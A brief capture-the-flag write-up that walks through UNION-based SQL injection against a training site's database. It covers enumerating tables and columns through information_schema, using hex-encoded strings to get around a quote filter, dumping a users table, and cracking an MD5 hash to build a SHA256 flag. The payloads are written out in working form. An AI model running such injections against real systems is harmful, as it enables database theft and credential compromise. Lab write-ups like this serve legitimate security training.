we can see all the tables in the database with this query : 

1 UNION SELECT table_schema, table_name FROM information_schema.tables

"	First name: Member_Sql_Injection
	Surname : users
" // Mouahaha

So lets see what is in this table : 

1 UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = 0x7573657273 (users in hex, a rule don't allow quotes)

So we see all the fields in the table users.

(user_id, f_n, l_n, town, country, planet, Commentaire, countersign)

let try to get some (numbers of ret columns is 2) :

1 UNION SELECT Commentaire, countersign FROM users


First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

decryptMD5(5ff9d0165b4f92b14994e5c685cdce28) : FortyTwo

Sha256(fortytwo) = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
